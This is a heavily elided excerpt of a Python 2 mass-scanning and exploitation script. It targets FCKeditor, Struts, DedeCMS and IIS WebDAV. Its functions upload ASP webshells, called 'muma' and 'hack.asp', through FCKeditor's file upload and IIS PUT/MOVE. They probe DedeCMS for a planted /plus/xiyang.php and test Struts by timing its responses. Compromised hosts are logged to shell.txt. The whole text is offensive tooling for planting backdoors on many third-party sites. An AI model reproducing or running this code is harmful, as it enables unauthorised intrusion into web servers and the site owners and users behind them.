...
monkey.patch_all()
import gevent
import os,sys,getopt,requests,re,time,Queue,threading,smtplib,base64,ctypes,urllib2,multiprocessing,httplib
    ...
    while 1:
        ...
        try:
            if not queue.empty():
                ...
                print '\033[1;34;40mexist fck dir '+line
                #linux color, color is blue
                ...
                if i==2:
                    ...
                    if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                        ...
                        if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                            #print ''+www+mumaname
                            print '\033[1;34;40m'+www+mumaname
                ...
                if i==0:
                    ...
                    continue
                        ...
                        if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                            ...
                            print '\033[1;34;40m'+www+shelladdr+'zy.asp/'+mumaname
...
def gotoshell(url):
    try:
        ...
        muma={
            'NewFile':(str(now)+'.asp',open(mumaaddr,'rb'))
        }
...
def thisMultiProcessThreadTest(writetxtname,queue,sign):
    #this func not runing
    '''
    save=open(writetxtname,'w')
    threads=30
    threadlist=[]
    ...
    for i in threadlist:
        i.join()
    save.close()
    print 'def thisMultiProcessThreadTest end'
    '''
...
def threadfunc(filex,sign):
    ...
    save=open('shell.txt','w')
    #writetxtname='shell.txt'
    ...
    '''
    geventSpawnReqthreadFunc=[gevent.spawn(fckgetshell,save,queue) for i in xrange(50)]
    for i in geventSpawnReqthreadFunc:
    	i.join()
    '''
        ...
        try:
            ...
            for i in poc:
                ...
                if sumtime>=5 and sumtime<=10:
                    print '\033[1;32;42m'+url
                    save.write(url+'\n')


        except Exception,e:
            #print e
            print '\033[1;32;42m'+'struts getshell function execution error'
            continue
        except Queue.Empty():
            break
    ...
    while not queue.empty():
        try:
            ...
            if req.code==200 and req.read().find('for my best girl')!=-1:
                ...
                print '\033[1;32;42m'+www+'/plus/xiyang.php'
            '''
            else:
            ...
            print '\033[1;32;42m'+www+' dede getshell error'+'\n'
            continue
...
def iisputgetshell(save,queue): 
    ...
    while 1:
        ...
        try:
            if not queue.empty():
                urlvalue=queue.get(block=False).replace('http://','')
                print '[*]scaning\t'+str(ecx)+urlvalue
                ecx=ecx+1
                ...
                if 'public' in headers and \
                   ...
                   headers['public'].find('MOVE') > 0:
                    ...
                    if iisshellprobe.code==200:
                        print '\033[1;34;40m'+'ASP webshell:', 'http://' + urlvalue + '/hack.asp'
...
def main():
    ...
    if (killrepeattxtname=='x' and fckgetshelltxtname=='g' and absname=='a' and threadnum==50 and strutsname=='s' and dedename=='d'):
